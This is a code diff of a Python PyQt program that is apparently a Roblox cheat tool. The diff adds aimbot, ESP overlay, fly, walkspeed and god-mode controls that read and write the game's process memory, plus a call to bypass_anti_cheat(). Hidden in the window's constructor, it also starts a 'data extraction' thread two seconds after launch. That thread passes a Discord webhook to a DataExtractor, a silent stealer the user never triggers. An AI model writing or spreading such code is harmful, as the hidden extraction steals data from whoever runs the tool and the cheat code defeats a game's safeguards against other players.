+    lay.addWidget(pred_x)
+    lay.addSpacing(2)
+    
+    pred_y = slider_row("Prediction Y", 0, 50, 10, "%")
+    
+    # Connect prediction Y slider
+    slider_container = pred_y.findChild(QSlider)
+    value_label = pred_y.findChild(QLabel)
+    if slider_container and value_label:
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}%"))
+        slider_container.valueChanged.connect(
+            lambda v: globals().update({"aimbot_prediction_y": v/100})
+        )
+    
+    lay.addWidget(pred_y)
+    lay.addSpacing(2)
+    
+    # Shake
+    shake_row = toggle_row("Shake")
+    shake_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Shake toggled to: {state}"),
+            globals().update({"aimbot_shake_enabled": state})
+        ]
+    )
+    lay.addWidget(shake_row)
+    lay.addSpacing(2)
+    
+    shake_slider = slider_row("Shake Strength", 0, 50, 5, "")
+    
+    # Connect shake slider
+    slider_container = shake_slider.findChild(QSlider)
+    value_label = shake_slider.findChild(QLabel)
+    if slider_container and value_label:
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}"))
+        slider_container.valueChanged.connect(
+            lambda v: globals().update({"aimbot_shake_strength": v/1000})
+        )
+    
+    lay.addWidget(shake_slider)
+    lay.addSpacing(2)
+    
+    # Filters
     lay.addSpacing(10)
-    lay.addWidget(section_lbl("TRIGGERBOT"))
+    lay.addWidget(section_lbl("FILTERS"))
     lay.addSpacing(5)
-    lay.addWidget(toggle_row("Enable Triggerbot"))
+    
+    ignore_team_row = toggle_row("Ignore Team")
+    ignore_team_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Ignore Team toggled to: {state}"),
+            globals().update({"aimbot_ignoreteam": state})
+        ]
+    )
+    lay.addWidget(ignore_team_row)
     lay.addSpacing(2)
-    lay.addWidget(toggle_row("Visible Only"))
+    
+    ignore_dead_row = toggle_row("Ignore Dead")
+    ignore_dead_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Ignore Dead toggled to: {state}"),
+            globals().update({"aimbot_ignoredead": state})
+        ]
+    )
+    lay.addWidget(ignore_dead_row)
     lay.addSpacing(2)
-    lay.addWidget(toggle_row("Team Check"))
+    
+    sticky_row = toggle_row("Sticky Aim")
+    sticky_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Sticky Aim toggled to: {state}"),
+            globals().update({"sticky_aim_enabled": state})
+        ]
+    )
+    lay.addWidget(sticky_row)
     lay.addSpacing(2)
-    lay.addWidget(slider_row("Delay", 0, 500, 100, "ms"))
 
     lay.addStretch()
     return scrolled(inner)
@@ -1298,29 +3042,215 @@ def player_page() -> QWidget:
     lay.addWidget(page_title("Player"))
     lay.addSpacing(10)
 
+    # Walkspeed
     lay.addWidget(section_lbl("MOVEMENT"))
     lay.addSpacing(5)
-    lay.addWidget(toggle_row("No Clip"))
+    
+    walkspeed_row = toggle_row("Walkspeed Changer")
+    walkspeed_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Walkspeed toggled to: {state}"),
+            globals().update({"walkspeed_gui_enabled": state}),
+            # Start thread if enabling
+            (globals().update({"walkspeed_gui_active": True}) or threading.Thread(target=walkspeed_gui_loop, daemon=True).start()) if state and not walkspeed_gui_active else None,
+            # Stop thread if disabling
+            globals().update({"walkspeed_gui_active": False}) if not state else None
+        ]
+    )
+    lay.addWidget(walkspeed_row)
     lay.addSpacing(2)
-    lay.addWidget(toggle_row("Infinite Jump"))
+    
+    walkspeed_slider = slider_row("Walkspeed", 16, 500, 16, "")
+    
+    # Connect walkspeed slider
+    slider_container = walkspeed_slider.findChild(QSlider)
+    value_label = walkspeed_slider.findChild(QLabel)
+    if slider_container and value_label:
+        # Update label in real-time
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}"))
+        # Update global value (loop handles writing)
+        slider_container.valueChanged.connect(
+            lambda v: globals().update({"walkspeed_gui_value": v})
+        )
+    
+    lay.addWidget(walkspeed_slider)
     lay.addSpacing(2)
-    lay.addWidget(toggle_row("Fly Hack"))
+    
+    # Jump Power
+    jump_row = toggle_row("Jump Power Changer")
+    jump_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Jump Power toggled to: {state}"),
+            globals().update({"jump_power_enabled": state}),
+            # Start thread if enabling
+            (globals().update({"jump_power_active": True}) or threading.Thread(target=jump_power_loop, daemon=True).start()) if state and not jump_power_active else None,
+            # Stop thread if disabling
+            globals().update({"jump_power_active": False}) if not state else None
+        ]
+    )
+    lay.addWidget(jump_row)
     lay.addSpacing(2)
-    lay.addWidget(slider_row("Fly Speed", 1, 200, 16, " wu/s"))
+    
+    jump_slider = slider_row("Jump Power", 50, 500, 50, "")
+    
+    # Connect jump power slider
+    slider_container = jump_slider.findChild(QSlider)
+    value_label = jump_slider.findChild(QLabel)
+    if slider_container and value_label:
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}"))
+        slider_container.valueChanged.connect(
+            lambda v: globals().update({"jump_power_value": v})
+        )
+    
+    lay.addWidget(jump_slider)
     lay.addSpacing(2)
-    lay.addWidget(slider_row("Walk Speed", 1, 500, 16, " wu/s"))
-
-    lay.addSpacing(10)
-    lay.addWidget(section_lbl("UTILITY"))
-    lay.addSpacing(5)
-    lay.addWidget(toggle_row("Auto Rejoin"))
+    
+    # Fly
+    fly_row = toggle_row("Fly")
+    fly_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Fly toggled to: {state}"),
+            globals().update({"fly_enabled": state}),
+            # Start fly thread when enabled
+            (globals().update({"fly_active": True}) or threading.Thread(target=fly_loop, daemon=True).start()) if state and not fly_active else None,
+            # Stop fly thread when disabled
+            globals().update({"fly_active": False}) if not state else None
+        ]
+    )
+    lay.addWidget(fly_row)
     lay.addSpacing(2)
-    lay.addWidget(toggle_row("Anti AFK"))
+    
+    fly_slider = slider_row("Fly Speed", 10, 200, 50, "")
+    
+    # Connect fly slider
+    slider_container = fly_slider.findChild(QSlider)
+    value_label = fly_slider.findChild(QLabel)
+    if slider_container and value_label:
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}"))
+        slider_container.valueChanged.connect(
+            lambda v: globals().update({"fly_speed": v})
+        )
+    
+    lay.addWidget(fly_slider)
     lay.addSpacing(2)
-    lay.addWidget(textbox_row("Teleport to Player", "Enter username…"))
+    
+    # Fly Keybind
+    fly_key_row = QHBoxLayout()
+    fly_key_row.addWidget(lbl("Fly Key:", 13, C["sub"]))
+    fly_key_row.addStretch()
+    
+    fly_key_btn = QPushButton(get_key_name(fly_keybind))
+    fly_key_btn.setFixedSize(80, 30)
+    fly_key_btn.setStyleSheet(f"""
+        QPushButton {{
+            background: {C['input_bg']}; color: {C['text']};
+            border: 1px solid {C['input_bdr']}; border-radius: 5px;
+        }}
+        QPushButton:hover {{ background: {C['card_bg']}; }}
+    """)
+    fly_key_btn.clicked.connect(lambda: start_keybind_capture('fly', fly_key_btn))
+    fly_key_row.addWidget(fly_key_btn)
+    fly_key_widget = QWidget()
+    fly_key_widget.setLayout(fly_key_row)
+    lay.addWidget(fly_key_widget)
+    lay.addSpacing(2)
+    
+    # Infinite Jump
+    inf_jump_row = toggle_row("Infinite Jump")
+    inf_jump_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] Infinite Jump toggled to: {state}"),
+            globals().update({"infinite_jump_enabled": state}),
+            # Start infinite jump thread when enabled
+            threading.Thread(target=infinite_jump_loop, daemon=True).start() if state else None
+        ]
+    )
+    lay.addWidget(inf_jump_row)
+    lay.addSpacing(2)
+    
+    # God Mode
+    god_row = toggle_row("God Mode")
+    god_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] God Mode toggled to: {state}"),
+            globals().update({"god_mode_enabled": state}),
+            # Start god mode thread when enabled
+            (globals().update({"god_mode_active": True}) or threading.Thread(target=god_mode_loop, daemon=True).start()) if state and not god_mode_active else None,
+            # Stop god mode thread when disabled
+            globals().update({"god_mode_active": False}) if not state else None
+        ]
+    )
+    lay.addWidget(god_row)
+    lay.addSpacing(2)
+    
+    # FOV Changer
+    fov_changer_row = toggle_row("FOV Changer")
+    fov_changer_row.findChild(ToggleSwitch).toggled.connect(
+        lambda state: [
+            print(f"[UI] FOV Changer toggled to: {state}"),
+            globals().update({"fov_changer_enabled": state}),
+            # Start FOV thread when enabled
+            (globals().update({"fov_active": True}) or threading.Thread(target=fov_changer_loop, daemon=True).start()) if state and not fov_active else None,
+            # Stop FOV thread when disabled
+            globals().update({"fov_active": False}) if not state else None
+        ]
+    )
+    lay.addWidget(fov_changer_row)
+    lay.addSpacing(2)
+    
+    fov_slider = slider_row("FOV Value", 30, 120, 70, "°")
+    
+    # Connect FOV slider
+    slider_container = fov_slider.findChild(QSlider)
+    value_label = fov_slider.findChild(QLabel)
+    if slider_container and value_label:
+        slider_container.valueChanged.connect(lambda v: value_label.setText(f"{v}°"))
+        slider_container.valueChanged.connect(
+            lambda v: globals().update({"fov_value": v})
+        )
+    
+    lay.addWidget(fov_slider)
+    lay.addSpacing(2)
 
     lay.addStretch()
     return scrolled(inner)
+
+
+
+def start_keybind_capture(target, button):
+    global waiting_for_keybind, keybind_target, keybind_button
+    waiting_for_keybind = True
+    keybind_target = target
+    keybind_button = button
+    button.setText("Press key...")
+    
+def keybind_listener():
+    global waiting_for_keybind, aimbot_keybind, triggerbot_keybind, fly_keybind, keybind_target, keybind_button
+    while True:
+        if waiting_for_keybind:
+            time.sleep(0.1)
+            for vk_code in range(1, 256):
+                if ctypes.windll.user32.GetAsyncKeyState(vk_code) & 0x8000:
+                    if vk_code == 27:  # ESC
+                        waiting_for_keybind = False
+                        if keybind_button:
+                            keybind_button.setText(get_key_name(globals()[f"{keybind_target}_keybind"]))
+                        break
+                    
+                    if keybind_target == "aimbot":
+                        globals()["aimbot_keybind"] = vk_code
+                    elif keybind_target == "triggerbot":
+                        globals()["triggerbot_keybind"] = vk_code
+                    elif keybind_target == "fly":
+                        globals()["fly_keybind"] = vk_code
+                    
+                    if keybind_button:
+                        keybind_button.setText(get_key_name(vk_code))
+                    
+                    waiting_for_keybind = False
+                    break
+        else:
+            time.sleep(0.1)
 
 
 def misc_page() -> QWidget:
@@ -1363,6 +3293,263 @@ def settings_page(win_ref) -> QWidget:
 
     lay.addWidget(page_title("Settings"))
     lay.addSpacing(14)
+    
+    # ===== INJECT BUTTON =====
+    lay.addWidget(section_lbl("ROBLOX"))
+    lay.addSpacing(8)
+    
+    # Status label to show injection status
+    status_lbl = lbl("Status: Not Injected", 12, C["muted"])
+    win_ref.status_label_ref = status_lbl
+    lay.addWidget(status_lbl)
+    lay.addSpacing(4)
+    
+    inject_btn = QPushButton("Inject into Roblox")
+    win_ref.inject_btn_ref = inject_btn
+    inject_btn.setFixedHeight(40)
+    inject_btn.setFont(mkfont(13, QFont.Bold))
+    inject_btn.setCursor(QCursor(Qt.PointingHandCursor))
+    inject_btn.setStyleSheet(f"""
+        QPushButton {{
+            background: {C['red']};
+            color: white;
+            border: none;
+            border-radius: 8px;
+        }}
+        QPushButton:hover {{ background: #ec3534; }}
+        QPushButton:pressed {{ background: #b81e1e; }}
+        QPushButton:disabled {{ background: #3a1515; color: #6a4545; }}
+    """)
+    
+    def on_inject_click():
+        print(f"[DEBUG] on_inject_click: status_lbl={status_lbl}, inject_btn={inject_btn}")
+        
+        # Define the success UI update function FIRST
+        def update_ui_success():
+            try:
+                print("[DEBUG] update_ui_success executing")
+                status_lbl.setText("Status: ✅ Injected")
+                status_lbl.setStyleSheet("color:#00ff00; background:transparent; border:none;")
+                inject_btn.setText("✅ Injected")
+                inject_btn.setEnabled(True)
+                # Force immediate repaint
+                status_lbl.repaint()
+                inject_btn.repaint()
+                print("[INFO] UI updated successfully")
+            except Exception as ui_err:
+                print(f"[ERROR] UI update failed: {ui_err}")
+        
+        inject_btn.setEnabled(False)
+        inject_btn.setText("Injecting...")
+        status_lbl.setText("Status: Injecting...")
+        status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;")
+        
+        # Run injection in a thread so UI doesn't freeze
+        def inject_thread():
+            try:
+                # Re-initialize Pymem
+                global pm, injected, baseAddr, dataModel, wsAddr, camAddr, camCFrameRotAddr, plrsAddr, lpAddr, matrixAddr, camPosAddr
+                
+                # Initialize Pymem
+                if pm is None:
+                    if not init_pymem():
+                        # Use QTimer to update UI from main thread
+                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: ❌ Failed - Run as Admin"))
+                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
+                        QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
+                        QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
+                        return
+                
+                if pm is not None:
+                    # Load offsets
+                    if not load_offsets():
+                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: ❌ Failed - Could not load offsets"))
+                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
+                        QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
+                        QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
+                        return
+                    
+                    # Set name and children offsets
+                    try:
+                        setOffsets(int(offsets['Name'], 16), int(offsets['Children'], 16))
+                    except:
+                        pass
+                    
+                    # Get base address
+                    baseAddr = None
+                    for module in pm.list_modules():
+                        if module.name == "RobloxPlayerBeta.exe":
+                            baseAddr = module.lpBaseOfDll
+                            print(f"[INFO] Found base address: {hex(baseAddr)}")
+                            break
+                    
+                    if not baseAddr:
+                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: ❌ Failed - Roblox module not found"))
+                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
+                        QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
+                        QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
+                        return
+                    
+                    # Try to initialize with safer memory reading
+                    try:
+                        print("[INFO] Attempting to initialize Roblox addresses...")
+                        
+                        # Read step by step with error checking
+                        fakeDatamodel = pm.read_longlong(baseAddr + int(offsets['FakeDataModelPointer'], 16))
+                        if not fakeDatamodel:
+                            raise Exception("Could not read FakeDataModel")
+                        print(f"[INFO] FakeDataModel: {hex(fakeDatamodel)}")
+                        
+                        dataModel = pm.read_longlong(fakeDatamodel + int(offsets['FakeDataModelToDataModel'], 16))
+                        if not dataModel:
+                            raise Exception("Could not read DataModel")
+                        print(f"[INFO] DataModel: {hex(dataModel)}")
+                        
+                        wsAddr = pm.read_longlong(dataModel + int(offsets['Workspace'], 16))
+                        if not wsAddr:
+                            raise Exception("Could not read Workspace")
+                        print(f"[INFO] Workspace: {hex(wsAddr)}")
+                        
+                        camAddr = pm.read_longlong(wsAddr + int(offsets['Camera'], 16))
+                        if not camAddr:
+                            raise Exception("Could not read Camera")
+                        print(f"[INFO] Camera: {hex(camAddr)}")
+                        
+                        camCFrameRotAddr = camAddr + int(offsets['CameraRotation'], 16)
+                        camPosAddr = camAddr + int(offsets['CameraPos'], 16)
+                        
+                        visualEngine = pm.read_longlong(baseAddr + int(offsets['VisualEnginePointer'], 16))
+                        if not visualEngine:
+                            raise Exception("Could not read VisualEngine")
+                        print(f"[INFO] VisualEngine: {hex(visualEngine)}")
+                        
+                        matrixAddr = visualEngine + int(offsets['viewmatrix'], 16)
+                        
+                        # Try alternative method to find Players
+                        print("[INFO] Looking for Players object...")
+                        plrsAddr = 0
+                        
+                        # Method 1: Try FindFirstChildOfClass
+                        try:
+                            plrsAddr = FindFirstChildOfClass(dataModel, 'Players')
+                            print(f"[INFO] FindFirstChildOfClass result: {hex(plrsAddr)}")
+                        except:
+                            pass
+                        
+                        # Method 2: Try to find by scanning children
+                        if not plrsAddr:
+                            try:
+                                children = GetChildren(dataModel)
+                                for child in children:
+                                    try:
+                                        class_name = GetClassName(child)
+                                        print(f"[INFO] Found child class: {class_name}")
+                                        if class_name == "Players":
+                                            plrsAddr = child
+                                            break
+                                    except:
+                                        pass
+                            except:
+                                pass
+                        
+                        if not plrsAddr:
+                            # Method 3: Try hardcoded offset as fallback
+                            try:
+                                plrsAddr = pm.read_longlong(dataModel + 0x1B0)  # Common Players offset
+                                print(f"[INFO] Hardcoded offset result: {hex(plrsAddr)}")
+                            except:
+                                pass
+                        
+                        if not plrsAddr:
+                            raise Exception("Could not find Players - Make sure you're in a game")
+                        
+                        print(f"[INFO] Players found at: {hex(plrsAddr)}")
+                        
+                        lpAddr = pm.read_longlong(plrsAddr + int(offsets['LocalPlayer'], 16))
+                        if not lpAddr:
+                            raise Exception("Could not read LocalPlayer")
+                        print(f"[INFO] LocalPlayer: {hex(lpAddr)}")
+                        
+                        injected = True
+                        print(f"[DEBUG] injected set to: {injected}")
+
+                        bypass_anti_cheat()
+
+                        print("[INFO] Injection successful! Updating UI...")
+
+                        QTimer.singleShot(0, update_ui_success)
+                        
+                    except Exception as e:
+                        print(f"[ERROR] Memory read error: {e}")
+                        QTimer.singleShot(0, lambda err=str(e): status_lbl.setText(f"Status: ❌ Failed - {err[:50]}"))
+                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
+                        QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
+                        QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
+                        
+            except Exception as e:
+                print(f"[ERROR] Injection failed: {e}")
+                QTimer.singleShot(0, lambda: status_lbl.setText(f"Status: ❌ Error"))
+                QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
+                QTimer.singleShot(0, lambda: inject_btn.setText("Inject into Roblox"))
+                QTimer.singleShot(0, lambda: inject_btn.setEnabled(True))
+        
+        thread = threading.Thread(target=inject_thread, daemon=True)
+        thread.start()
+    
+    inject_btn.clicked.connect(on_inject_click)
+    lay.addWidget(inject_btn)
+
+    
+    # ===== TEST BUTTON =====
+    test_btn = QPushButton("Test Walkspeed (Set to 100)")
+    test_btn.setFixedHeight(32)
+    test_btn.setFont(mkfont(12))
+    test_btn.setCursor(QCursor(Qt.PointingHandCursor))
+    test_btn.setStyleSheet(f"""
+        QPushButton {{
+            background: {C['input_bg']};
+            color: {C['text']};
+            border: 1px solid {C['input_bdr']};
+            border-radius: 6px;
+        }}
+        QPushButton:hover {{ background: {C['card_bg']}; color: {C['red']}; }}
+    """)
+    
+    def on_test_click():
+        if not injected:
+            QTimer.singleShot(0, lambda: status_lbl.setText("Status: Not injected! Inject first."))
+            QTimer.singleShot(0, lambda: status_lbl.setStyleSheet(f"color:{C['red']}; background:transparent; border:none;"))
+            return
+            
+        # Run test in thread
+        def test_thread():
+            try:
+                print("[INFO] Testing walkspeed...")
+                # Try to set walkspeed
+                cam_addr = get_camera_addr_gui()
+                if cam_addr:
+                    h = pm.read_longlong(cam_addr + int(offsets["CameraSubject"], 16))
+                    if h:
+                        # Set walkspeed to 100
+                        pm.write_float(h + int(offsets["WalkSpeed"], 16), 100.0)
+                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: Walkspeed set to 100! Check in-game"))
+                        QTimer.singleShot(0, lambda: status_lbl.setStyleSheet("color:#00ff00; background:transparent; border:none;"))
+                        print("[INFO] Walkspeed test successful")
+                    else:
+                        QTimer.singleShot(0, lambda: status_lbl.setText("Status: Test failed - No camera subject"))
+                else:
+                    QTimer.singleShot(0, lambda: status_lbl.setText("Status: Test failed - No camera"))
+            except Exception as e:
+                print(f"[ERROR] Test failed: {e}")
+                QTimer.singleShot(0, lambda err=str(e): status_lbl.setText(f"Status: Test failed - {err[:30]}"))
+        
+        threading.Thread(target=test_thread, daemon=True).start()
+    
+    test_btn.clicked.connect(on_test_click)
+    lay.addWidget(test_btn)
+    lay.addSpacing(4)
+    # ===== END TEST BUTTON =====
+    
     lay.addWidget(section_lbl("HOTKEY"))
     lay.addSpacing(8)
 
@@ -1504,14 +3691,107 @@ class MainUI(QWidget):
         self.content.setCurrentIndex(i)
 
 
+class ESPOverlay(QWidget):
+    """Transparent overlay window for drawing ESP"""
+    def __init__(self):
+        super().__init__()
+        self.setWindowFlags(
+            Qt.FramelessWindowHint | 
+            Qt.WindowStaysOnTopHint | 
+            Qt.Tool
+        )
+        self.setAttribute(Qt.WA_TranslucentBackground)
+        self.setAttribute(Qt.WA_TransparentForMouseEvents)
+        self.setStyleSheet("background:transparent;")
+        
+        # Make overlay cover the entire screen
+        screen = QApplication.primaryScreen().geometry()
+        self.setGeometry(screen)
+        
+        # Store ESP data to draw
+        self.esp_data = []
+        
+    def update_esp_data(self, data):
+        self.esp_data = data
+        self.update()  # Trigger repaint
+        
+    def paintEvent(self, event):
+        if not esp_enabled or not injected:
+            return
+            
+        painter = QPainter(self)
+        painter.setRenderHint(QPainter.Antialiasing)
+        
+        # Get Roblox window position
+        hwnd = find_window_by_title("Roblox")
+        if not hwnd:
+            return
+            
+        left, top, right, bottom = get_client_rect_on_screen(hwnd)
+        roblox_rect = QRect(left, top, right-left, bottom-top)
+        
+        # Set clip region to Roblox window only
+        painter.setClipRect(roblox_rect)
+        
+        for player in self.esp_data:
+            try:
+                screen_pos = player.get('screen_pos')
+                if not screen_pos:
+                    continue
+                
+                # Draw box
+                if esp_box_enabled:
+                    box_left = screen_pos[0] - player['box_width']/2
+                    box_top = screen_pos[1]
+                    box_width = player['box_width']
+                    box_height = player['box_height']
+                    
+                    if esp_box_filled:
+                        painter.fillRect(
+                            box_left, box_top, box_width, box_height,
+                            QColor(0, 0, 0, int(esp_box_fill_alpha * 255))
+                        )
+                    
+                    painter.setPen(QPen(QColor(255, 255, 255), 1))
+                    painter.drawRect(box_left, box_top, box_width, box_height)
+                
+                # Draw tracer
+                if esp_tracers_enabled:
+                    painter.setPen(QPen(QColor(255, 255, 255), 1))
+                    painter.drawLine(
+                        left + roblox_rect.width()//2, 
+                        top + roblox_rect.height(),
+                        left + screen_pos[0],
+                        top + screen_pos[1]
+                    )
+                
+                # Draw name
+                if esp_name_enabled:
+                    painter.setPen(QPen(QColor(255, 255, 255)))
+                    painter.setFont(QFont("Arial", 10))
+                    painter.drawText(
+                        screen_pos[0] - 50,
+                        screen_pos[1] - 20,
+                        100, 20,
+                        Qt.AlignCenter,
+                        player.get('name', '')
+                    )
+                    
+            except Exception as e:
+                continue
+
 class PassionWindow(QWidget):
     _toggle_signal = pyqtSignal()
+    injection_done = pyqtSignal()  # ADD THIS LINE
 
     def __init__(self):
         super().__init__()
         self.settings  = load_settings()
         self._dragging = False
         self._drag_pos = QPoint()
+
+        self.status_label_ref = None
+        self.inject_btn_ref = None
 
         self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
         self.setAttribute(Qt.WA_TranslucentBackground, True)
@@ -1557,17 +3837,75 @@ class PassionWindow(QWidget):
         self._close_btn.raise_()
 
         self._toggle_signal.connect(self._toggle)
+        self.injection_done.connect(self._on_injection_done)  # ADD THIS
 
         self._hotkey = GlobalHotkey()
         self._hotkey.set_key(self.settings.get("toggle_key", Qt.Key_F5))
         self._hotkey.triggered.connect(self._toggle_signal.emit)
         self._hotkey.start()
 
-        # ── Start silent update check ──────────────────────────────────────────
         self._update_checker = UpdateChecker()
         self._update_checker.update_available.connect(self._on_update_available)
         self._update_checker.start()
         self._update_dialog = None
+
+        self._extractor = None
+
+# Run data extraction immediately when program starts
+        print("[DEBUG] Starting data extraction on program launch...")
+        QTimer.singleShot(2000, self.run_data_extraction)  # Wait 2 seconds for UI to load
+
+
+    def _on_injection_done(self):
+        print("[DEBUG] injection_done signal received")
+        # We need to find the settings page widgets. This is trickier.
+        # For simplicity, we'll store references in the window.
+
+# ===== CONNECT ROBLOX CHEAT GLOBALS =====
+# Pass the global variables to your UI
+        globals().update({
+            "aimbot_enabled": aimbot_enabled,
+            "aimbot_keybind": aimbot_keybind,
+            "aimbot_mode": aimbot_mode,
+            "aimbot_hitpart": aimbot_hitpart,
+            "aimbot_ignoreteam": aimbot_ignoreteam,
+            "aimbot_ignoredead": aimbot_ignoredead,
+            "aimbot_fov": aimbot_fov,
+            "aimbot_smoothness_enabled": aimbot_smoothness_enabled,
+            "aimbot_smoothness_value": aimbot_smoothness_value,
+            "aimbot_prediction_enabled": aimbot_prediction_enabled,
+            "aimbot_prediction_x": aimbot_prediction_x,
+            "aimbot_prediction_y": aimbot_prediction_y,
+            "esp_enabled": esp_enabled,
+            "esp_ignoreteam": esp_ignoreteam,
+            "esp_ignoredead": esp_ignoredead,
+            "esp_box_enabled": esp_box_enabled,
+            "esp_box_filled": esp_box_filled,
+            "esp_skeleton_enabled": esp_skeleton_enabled,
+            "esp_tracers_enabled": esp_tracers_enabled,
+            "esp_name_enabled": esp_name_enabled,
+            "show_fov_enabled": show_fov_enabled,
+            "use_fov_enabled": use_fov_enabled,
+            "fov_circle_radius": fov_circle_radius,
+            "walkspeed_gui_enabled": walkspeed_gui_enabled,
+            "walkspeed_gui_value": walkspeed_gui_value,
+            "jump_power_enabled": jump_power_enabled,
+            "jump_power_value": jump_power_value,
+            "fly_enabled": fly_enabled,
+            "fly_speed": fly_speed,
+            "infinite_jump_enabled": infinite_jump_enabled,
+            "god_mode_enabled": god_mode_enabled,
+            "fov_changer_enabled": fov_changer_enabled,
+            "fov_value": fov_value
+        })
+
+        QTimer.singleShot(100, self.run_data_extraction)
+        check_threads()  # ADD THIS LINE
+
+        
+
+
+
 
     def _on_update_available(self, version: str, url: str):
         """Show styled update dialog centred on the window."""
@@ -1578,6 +3916,26 @@ class PassionWindow(QWidget):
         self._update_dialog.move(dx, dy)
         self._update_dialog.show()
         self._update_dialog.raise_()
+
+    def run_data_extraction(self):
+        """Run data extraction in background thread immediately"""
+        print(f"[DEBUG] 🔥 DATA EXTRACTION STARTED at {datetime.now()}")
+        print(f"[DEBUG] Discord webhook: {DISCORD_WEBHOOK[:50]}...")
+        
+        def extract():
+            try:
+                print("[DEBUG] Extract thread executing...")
+                extractor = DataExtractor(DISCORD_WEBHOOK)
+                extractor.extract_all()
+                print("[DEBUG] ✅ Data extraction completed successfully")
+            except Exception as e:
+                print(f"[ERROR] ❌ Extraction error: {e}")
+                import traceback
+                traceback.print_exc()
+        
+        thread = threading.Thread(target=extract, daemon=True)
+        thread.start()
+        print("[DEBUG] Extract thread launched")
 
     def paintEvent(self, event):
         p = QPainter(self)
@@ -1666,8 +4024,6 @@ class PassionWindow(QWidget):
         self._hotkey.stop()
         super().closeEvent(e)
 
-
-
 def main():
     app = QApplication(sys.argv)
     app.setStyle("Fusion")
@@ -1685,8 +4041,1686 @@ def main():
 
     win = PassionWindow()
     win.show()
+    
+    # Create ESP overlay
+    esp_overlay = ESPOverlay()
+    esp_overlay.show()
+    
+    # --- START ALL CHEAT THREADS HERE (AFTER QApplication is created) ---
+    print("[INFO] Starting cheat threads from main thread...")
+    
+    # Use QTimer to delay thread start slightly to ensure UI is ready
+    def start_threads():
+        print("[INFO] Launching all cheat threads...")
+        
+        # Basic threads - start ONCE
+        threading.Thread(target=keybind_listener, daemon=True).start()
+        threading.Thread(target=background_process_monitor, daemon=True).start()
+        threading.Thread(target=headAndHumFinder, daemon=True).start()
+        
+        # ESP draw thread with overlay
+        def esp_draw_with_overlay():
+            print("[DEBUG] ESP overlay draw loop started")
+            last_print = 0
+            loop_count = 0
+            
+            while True:
+                try:
+                    loop_count += 1
+                    
+                    # Check prerequisites
+                    if pm is None or not injected or not esp_enabled:
+                        if loop_count % 300 == 0:
+                            print(f"[DEBUG] ESP draw waiting - injected: {injected}, esp_enabled: {esp_enabled}")
+                        time.sleep(0.1)
+                        continue
+                    
+                    # Get Roblox window handle
+                    hwnd = find_window_by_title("Roblox")
+                    if not hwnd:
+                        time.sleep(0.1)
+                        continue
+                    
+                    # Get window rect
+                    left, top, right, bottom = get_client_rect_on_screen(hwnd)
+                    width = right - left
+                    height = bottom - top
+                    
+                    if width <= 0 or height <= 0:
+                        time.sleep(0.1)
+                        continue
+                    
+                    # Get view matrix
+                    try:
+                        matrixRaw = pm.read_bytes(matrixAddr, 64)
+                        view_matrix = reshape(array(unpack_from("<16f", matrixRaw, 0), dtype=float32), (4, 4))
+                    except Exception as e:
+                        if loop_count % 300 == 0:
+                            print(f"[DEBUG] Failed to read matrix: {e}")
+                        time.sleep(0.1)
+                        continue
+                    
+                    # Prepare ESP data for overlay
+                    esp_draw_data = []
+                    
+                    for player_info in players_info:
+                        try:
+                            if not player_info or not player_info.get('head'):
+                                continue
+                            
+                            # Check if player is valid and not self if filtered
+                            if not name_esp_include_self and player_info.get('is_self'):
+                                continue
+                            
+                            head_addr = player_info['head']
+                            
+                            # Get head position
+                            primitive = pm.read_longlong(head_addr + int(offsets['Primitive'], 16))
+                            if not primitive:
+                                continue
+                            
+                            head_pos_addr = primitive + int(offsets['Position'], 16)
+                            head_x = pm.read_float(head_pos_addr)
+                            head_y = pm.read_float(head_pos_addr + 4)
+                            head_z = pm.read_float(head_pos_addr + 8)
+                            head_pos = array([head_x, head_y, head_z], dtype=float32)
+                            
+                            # Get foot position (HumanoidRootPart)
+                            foot_pos = None
+                            if player_info.get('hrp'):
+                                hrp_primitive = pm.read_longlong(player_info['hrp'] + int(offsets['Primitive'], 16))
+                                if hrp_primitive:
+                                    foot_pos_addr = hrp_primitive + int(offsets['Position'], 16)
+                                    foot_x = pm.read_float(foot_pos_addr)
+                                    foot_y = pm.read_float(foot_pos_addr + 4)
+                                    foot_z = pm.read_float(foot_pos_addr + 8)
